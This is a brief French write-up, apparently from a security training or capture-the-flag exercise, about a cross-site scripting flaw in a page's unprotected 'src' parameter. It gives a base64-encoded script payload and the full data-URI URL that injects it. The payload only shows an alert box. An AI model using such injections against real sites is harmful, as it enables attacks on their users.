Dans la page [URL]?page=media&src=nsa, la source n'est pas protégé.

Une injection d'un script JS est possible en l'encodant en base64.

`<script>alert("coucou")</script>` => `PHNjcmlwdD5hbGVydCgiY291Y291Iik8L3NjcmlwdD4=` 

A écrire dans la src :

> [URL]?page=media&src=data:text/html;base64;PHNjcmlwdD5hbGVydCgiY291Y291Iik8L3NjcmlwdD4=